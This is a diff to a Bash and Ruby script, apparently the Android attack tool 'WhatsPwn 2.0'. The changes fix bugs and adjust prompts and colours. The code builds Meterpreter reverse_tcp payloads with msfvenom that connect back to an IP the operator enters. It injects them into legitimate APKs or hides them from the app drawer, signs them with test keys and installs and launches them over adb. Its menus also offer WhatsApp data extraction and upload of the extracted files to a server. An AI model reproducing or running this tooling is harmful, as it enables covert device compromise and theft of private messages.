@@ -32,6 +32,7 @@ CYAN='\033[0;36m'
 # EXIT TRAP CTRL + C
 EXITCODE() {
 	${WDIR}/bin/adb kill-server
+	clear
 	exit
 }
 
@@ -66,7 +67,8 @@ CHKAUTO() {
 
 # ERROR IN CONNECTION
 FAIL_MSG(){
-	echo -e "\n${RED}YOU ARE NOT CONNECTED${NONE}" && echo -n "\nPress any key to continue ..." && read -n 1
+	echo -e "\n${RED}YOU ARE NOT CONNECTED${NONE}" && echo -e -n "\nPress any key to continue ..." && read -n 1
+	MAIN_INTERFACE
 }
 #######################################################################################################################
 #                                                   MAIN FUNCTIONS                                                    #
@@ -329,7 +331,7 @@ IMPORT_PERMISSIONS()
 print "[*] REBUILDING #{LEGITIMATE_APK} WITH METERPRETER INJECTION AS #{injected_apk} ...\n"
 `apktool b -o $WDIR/bin/Payloads/#{injected_apk} $WDIR/tmp/Legitimate`
 print "[*] SIGNING #{injected_apk} ...\n"
-`java -jar $WDIR/bin/signapk.jar testkey.pk8 testkey.x509.pem $WDIR/bin/Payloads/#{injected_apk} $WDIR/bin/Payloads/Signed/#{injected_apk}`
+`java -jar $WDIR/bin/signapk.jar testkey.x509.pem testkey.pk8 $WDIR/bin/Payloads/#{injected_apk} $WDIR/bin/Payloads/Signed/#{injected_apk}`
 
 puts "[+] INFECTED FILE $WDIR/bin/Payloads/Signed/#{injected_apk} READY.\n"
 EORUBY
@@ -340,34 +342,40 @@ EORUBY
 
 # VISIBLE
 VISIBLE() {
-	echo -e -n "\n\n${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE IP IN WHICH THE PAYLOAD WILL CONNECT BACK TO [${SERV}]: ${NONE}"
+	echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE IP IN WHICH THE PAYLOAD WILL CONNECT BACK TO [${CYAN}${SERV}${NONE}${BOLD}]: ${NONE}"
 	read PAYLOAD_IP
-	echo -e -n "\n\n${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE PORT [${PAYLOAD_PORT}]: ${NONE}"
+	echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE PORT [${CYAN}${PAYLOAD_PORT}${NONE}${BOLD}]: ${NONE}"
 	read PAYLOAD_PORT
-	echo -e -n "\n\n${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE NAME OF THE OUTPUT PAYLOAD WITHOUT .APK [${PAYLOAD_NAME}]: ${NONE}"
+	echo -e -n "${BOLD}${CYAN}WP${NONE}> ${BOLD}ENTER THE NAME OF THE OUTPUT PAYLOAD -WITHOUT .APK- [${CYAN}${PAYLOAD_NAME}${NONE}${BOLD}]: ${NONE}"
 	read PAYLOAD_NAME
-	echo -e "${BOLD}CREATING PAYLOAD ... ${GREEN}[OK]${NONE}"
-	msfvenom -p android/meterpreter/reverse_tcp LHOST=${PAYLOAD_IP} LPORT=${PAYLOAD_PORT} R > ${WDIR}/bin/Payloads/${PAYLOAD_NAME}.apk
-	PAYLOAD="${WDIR}/bin/Payloads/${PAYLOAD_NAME}.apk"
-	echo -e "\n${GREEN}PAYLOAD CREATED SUCCESSFULLY ${NONE}[${CYAN}${PAYLOAD}${NONE}]"
+	echo -e "CREATING PAYLOAD ... [${BOLD}WAIT${NONE}]"
+	msfvenom --platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=${PAYLOAD_IP} LPORT=${PAYLOAD_PORT} R > ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}.apk
+	java -jar ${WDIR}/bin/signapk.jar ${WDIR}/bin/testkey.x509.pem ${WDIR}/bin/testkey.pk8 ${WDIR}/bin/Payloads/unsigned_${PAYLOAD_NAME}.apk ${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk
+	PAYLOAD="${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}.apk"
+	echo -e "CREATING PAYLOAD ... [${GREEN}OK${NONE}]"
+	echo -e "[${PAYLOAD}]"
+	PAYLOAD_INT
 }
 
 # RELAUNCH OR INSTALL PAYLOAD INTO DEVICE
 RELAUNCH() {
 	INSTALL(){
-		if [[ -z CONNECTED ]]; then
-			echo -e "${BOLD}INSTALLING PAYLOAD APK ... ${GREEN}[OK]${NONE}"
+		if [[ -n $CONNECTED ]]; then
+			echo -e "${NONE}INSTALLING PAYLOAD APK ... ${GREEN}[OK]${NONE}"
 			${WDIR}/bin/adb install ${PAYLOAD}
-			echo -e "${BOLD}INITIALIZING PAYLOAD APK ... ${GREEN}[OK]${NONE}"
+			echo -e "${NONE}INITIALIZING PAYLOAD APK ... ${GREEN}[OK]${NONE}"
 			${WDIR}/bin/adb shell am start ${USER} -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
+		else
+			FAIL_MSG
 		fi
 	}
 	if [[ -z $PAYLOAD ]]; then
-		if [ find ${WDIR}/bin/Payloads/Signed -prune -empty ];then
-			echo -e -n "COULD NOT FIND ANY PAYLOAD, CREATE ONE NOW? [Y/N]: "
+		if [ `find ${WDIR}/bin/Payloads/Signed -prune -empty` ];then
+			echo -e "${RED}COULD NOT FIND ANY PAYLOAD${NONE}"
+			echo -e-n "\n${CYAN}WP${NONE}> ${BOLD}CREATE ONE NOW? [${CYAN}Y${NONE}${BOLD}/${CYAN}N${BOLD}]: ${NONE}"
 			read CREATE_PAYLOAD
 			case "$CREATE_PAYLOAD" in
-				 y|Y|YES|yes) echo -e -n "HIDDEN OR VISIBLE? [H/V]: " && read HV
+				 y|Y|YES|yes) echo -e -n "${CYAN}WP${NONE}> ${BOLD}HIDDEN OR VISIBLE? [${CYAN}H${NONE}${BOLD}/${CYAN}V${NONE}]: " && read HV
 				case "$HV" in
 					H|h) HIDDEN && INSTALL ;;
 					v|V) VISIBLE && INSTALL ;;
@@ -376,9 +384,9 @@ RELAUNCH() {
 			esac
 		else
 			NUM_PAYLOADS=$(find ${WDIR}/bin/Payloads/Signed/ -mindepth 1 -type f -name "*.apk" -exec printf x \; | wc -c)
-			echo -e "${BOLD}FOUND THIS ${NUM_PAYLOADS} SIGNED PAYLOADS ...${NONE}"
-			ls ${WDIR}/bin/Payloads/Signed/*.apk
-			echo -e -n "\nENTER THE NAME OF THE ONE YOU WANT TO USE: "
+			echo -e "${BOLD}FOUND ${CYAN}${NUM_PAYLOADS}${NONE}${BOLD} SIGNED PAYLOADS:${NONE}\n"
+			ls ${WDIR}/bin/Payloads/Signed/*.apk | awk -F "/" '{print $NF}'
+			echo -e -n "\n${CYAN}WP${NONE}> ${BOLD}ENTER THE NAME OF THE ONE YOU WANT TO USE: ${NONE}"
 			read $PAYLOAD_NAME
 			PAYLOAD=${WDIR}/bin/Payloads/Signed/${PAYLOAD_NAME}
 			INSTALL
@@ -392,14 +400,12 @@ RELAUNCH() {
 #######################################################################################################################
 # PAYLOAD INTERFACE
 PAYLOAD_INT() {
-	if [[ -d ${WDIR}/bin/Payloads/Signed/ ]]; then
-		continue
-	else
+	if [[ ! -d ${WDIR}/bin/Payloads/Signed/ ]]; then
 		mkdir -p ${WDIR}/bin/Payloads/Signed/
 	fi
 	clear
 	cat ${WDIR}/bin/motd
-	echo -e "\n                                                 DEVICE STATUS: ${STATUS}"
+	echo -e "\n                                                 ${BOLD}DEVICE STATUS: ${STATUS}"
 	echo -e "\n${BOLD}WHAT DO YOU WANT TO DO?${CYAN}\n
 	1) INJECT METERPRETER PAYLOAD INTO LEGITIMATE APK
 	2) CREATE HIDDEN METERPRETER PAYLOAD [NOT VISIBLE IN DRAWER]
@@ -407,7 +413,7 @@ PAYLOAD_INT() {
 	4) INSTALL OR RELAUNCH PAYLOAD IN DEVICE
 	99) RETURN TO MAIN MENU
 	x) EXIT${NONE}"
-	echo -e -n "\n${CYAN}WAP${NONE}>"
+	echo -e -n "\n${CYAN}WP${NONE}> "
 	read MENU
 	case "$MENU" in
 		1) INJECTION ;;
@@ -472,12 +478,12 @@ EOF
 	echo -e "\n${BOLD}WHAT DO YOU WANT TO DO?${CYAN}\n
 	1) START FULL ATTACK
 	2) LAUNCH SHELL
-	3) EMERGENCY RESTORE WHATSAPP (IN CASE OF ERROR)
-	4) JUST RUN EXTRACTION (REMOTE)
+	3) EMERGENCY RESTORE WHATSAPP
+	4) JUST RUN EXTRACTION
 	5) UPLOAD FILES TO SERVER
 	6) PAYLOAD
 	x) EXIT${NONE}"
-	echo -e -n "\n${CYAN}WAP${NONE}>"
+	echo -e -n "\n${CYAN}WP${NONE}> "
 	read MENU
 	case "$MENU" in
 		1) CHKAUTO && FULL_ATTACK ;;
@@ -560,17 +566,17 @@ fi
 # CREATE TEMPORARY DIRECTORY
 mkdir -p ${WDIR}/tmp/
 
-# DEACTIVATED FOR DEBUGGING PURPOSES
 # ATTEMPT CONNECTION TO DEVICE IN BACKGROUND
 #while true; do
 #	# CHECK IF DEVICE IS NOT CONNECTED AND WAITS FOR IT
 #	if [[ ! -f ${WDIR}/tmp/ADB_Devices ]]; then
-#			echo -e "${BOLD}CONNECT THE DEVICE${NONE}"
+#			echo -e "${BOLD}CONNECT THE DEVICE${NONE}\n"
+#			${WDIR}/bin/adb start-server > /dev/null
 #			${WDIR}/bin/adb wait-for-device > /dev/null
 #	fi
 #	# EXPORT RESULT OF 'adb devices' COMMAND TO A FILE
 #	${WDIR}/bin/adb devices > ${WDIR}/tmp/ADB_Devices
-#	# IF THE FILE CONTAINS AN IP, SET IT AS VARIABLE	
+#	# IF THE FILE CONTAINS AN IP, SET IT AS VARIABLE
 #	IP=$(grep -oE "[0-9]{1,3}(\.[0-9]{1,3}){3}" ${WDIR}/tmp/ADB_Devices)
 #	# IF IP VARIABLE IS SET THEN IT IS CONNECTED WIRELESSLY
 #	if [[ -n "$IP" ]]; then
@@ -685,8 +691,8 @@ if [[ $# > 0 ]]; then
 		# UPLOAD EXTRACTED FILES TO SERVER
 		--upload|-u|6) UPLOAD ;;
 		# LAUNCH CLI INTERFACE
-		-i|--interface|8) USEINTERFACE="Y" && MAIN_INTERFACE && break ;;
-		-v|--version) echo "WhatsPwn 2.0" && exit 0
+		-i|--interface|8) USEINTERFACE="Y" && MAIN_INTERFACE ;;
+		-v|--version) echo "WhatsPwn 2.0" && exit ;;
 		# ANY OTHER OPTION
 		*) cat ${WDIR}/bin/USAGE ;;
 	esac
